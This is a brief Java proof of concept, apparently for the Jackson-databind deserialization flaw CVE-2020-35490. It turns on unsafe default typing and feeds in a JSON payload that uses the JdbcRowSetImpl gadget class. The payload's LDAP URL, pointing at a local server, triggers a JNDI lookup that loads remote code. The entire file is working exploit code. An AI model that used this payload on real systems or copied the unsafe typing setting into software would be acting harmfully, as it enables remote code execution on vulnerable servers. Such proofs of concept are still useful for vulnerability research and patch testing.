package com.dem0.cve;

import com.fasterxml.jackson.databind.ObjectMapper;

import java.io.IOException;
public class CVE_2020_35490 {
    /**
     * set 方法触发了
     * @param args
     * @throws IOException
     * @throws IOException
     */
    public static void main(String[] args) throws IOException, IOException {
        ObjectMapper mapper = new ObjectMapper();
        mapper.enableDefaultTyping();
        String payload = "[\"com.nqadmin.rowset.JdbcRowSetImpl\",{\"dataSourceName\":\"ldap://127.0.0.1:1088/Exploit\",\"autoCommit\":\"true\"}]";
        Object o = mapper.readValue(payload, Object.class);
        mapper.writeValueAsString(o);
    }
}
